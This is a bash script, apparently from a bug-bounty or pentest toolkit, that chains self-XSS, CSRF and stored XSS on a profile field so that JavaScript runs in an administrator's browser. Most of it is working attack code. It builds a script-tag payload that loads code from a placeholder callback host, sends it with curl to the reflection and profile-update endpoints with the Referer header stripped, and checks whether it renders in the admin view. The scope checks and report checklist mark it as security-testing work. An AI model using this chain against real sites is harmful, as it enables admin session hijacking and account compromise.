#!/usr/bin/env bash
# chain/selfxss-csrf-stored.sh
#
# Premise: a self-XSS by itself is not a finding. Chain three weak
# primitives into a critical:
#   1. Self-XSS on a user-controlled profile field
#   2. CSRF on the profile-update endpoint
#   3. The resulting payload is stored and rendered to OTHER users
#      (e.g. admin views the user list)
#
# Result: any logged-in user can force-execute JS in an admin's browser.

PHASE="chain-selfxss-csrf-stored"
. "$(dirname "$0")/../vuln/_lib.sh"
require_target
ensure_scope
OUTDIR=$(out_dir "$PHASE")

XSS_URL="${XSS_URL:-}"
CSRF_URL="${CSRF_URL:-}"
ADMIN_VIEW_URL="${ADMIN_VIEW_URL:-}"
AUTH="${AUTH:-}"

[ -z "$XSS_URL" ] && { log ERR "XSS_URL required (profile-field endpoint where the XSS reflects)"; exit 2; }
[ -z "$CSRF_URL" ] && { log ERR "CSRF_URL required (profile-update endpoint with weak/no CSRF token)"; exit 2; }
[ -z "$ADMIN_VIEW_URL" ] && { log WARN "ADMIN_VIEW_URL unset — chain confirms only as far as 'stored' without it"; }

PAYLOAD='"><script src="https://YOUR-XSS-CALLBACK.com/payload.js"></script>'
[ -n "${BLIND_XSS_URL:-}" ] && PAYLOAD='"><script src="'$BLIND_XSS_URL'/c.js"></script>'

# Step 1: confirm self-XSS reflection point
log INFO "step 1: confirming reflection at $XSS_URL"
forged=$(echo "$XSS_URL" | sed 's|=[^&]*|='"$(printf '%s' "$PAYLOAD" | jq -sRr @uri)"'|')
resp=$(curl -sS --max-time 10 -H "$AUTH" "$forged" 2>/dev/null | head -c 4000)
if echo "$resp" | grep -qF "YOUR-XSS-CALLBACK"; then
    echo "REFLECTED" > "$OUTDIR/step1-reflection.txt"
    log INFO "  ✓ reflection confirmed"
else
    log WARN "  no reflection — chain breaks at step 1"
    exit 0
fi

# Step 2: confirm CSRF on profile-update endpoint
# Method: try the same update from a clean session (no Referer, no CSRF token)
log INFO "step 2: probing CSRF on $CSRF_URL"
csrf_resp=$(curl -sS --max-time 10 -X POST "$CSRF_URL" \
    -H "$AUTH" -H 'Referer:' \
    -d "field=$PAYLOAD" \
    -w 'HTTP_STATUS:%{http_code}' 2>/dev/null)
if echo "$csrf_resp" | grep -qE 'HTTP_STATUS:(20[01]|30[0-9])'; then
    log INFO "  ✓ CSRF appears exploitable (accepted without Referer)"
    echo "$csrf_resp" > "$OUTDIR/step2-csrf.txt"
else
    log WARN "  Referer required — try Origin: spoofing or SameSite=None cookie analysis"
    exit 0
fi

# Step 3: confirm the payload is rendered to a higher-privilege view
if [ -n "$ADMIN_VIEW_URL" ] && [ -n "${ADMIN_AUTH:-}" ]; then
    log INFO "step 3: checking $ADMIN_VIEW_URL (with admin auth) for stored payload"
    admin_resp=$(curl -sS --max-time 10 -H "$ADMIN_AUTH" "$ADMIN_VIEW_URL" 2>/dev/null)
    if echo "$admin_resp" | grep -qF "YOUR-XSS-CALLBACK"; then
        log INFO "  ✓ CHAIN CONFIRMED — payload renders in admin context"
        echo "STORED IN ADMIN CONTEXT" > "$OUTDIR/step3-confirmed.txt"
    else
        log WARN "  payload not in admin view — likely sanitized on render"
    fi
fi

log INFO "chain done — review $OUTDIR/{step1,step2,step3}-*.txt"
log INFO "report-writing checklist:"
log INFO "  1. Title: 'CSRF + Stored XSS in /profile/bio → admin session takeover'"
log INFO "  2. CVSS: AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (≈ 9.0)"
log INFO "  3. Reproduction: 3 distinct curls (one per step)"
log INFO "  4. Impact: any logged-in user → arbitrary JS in admin context"
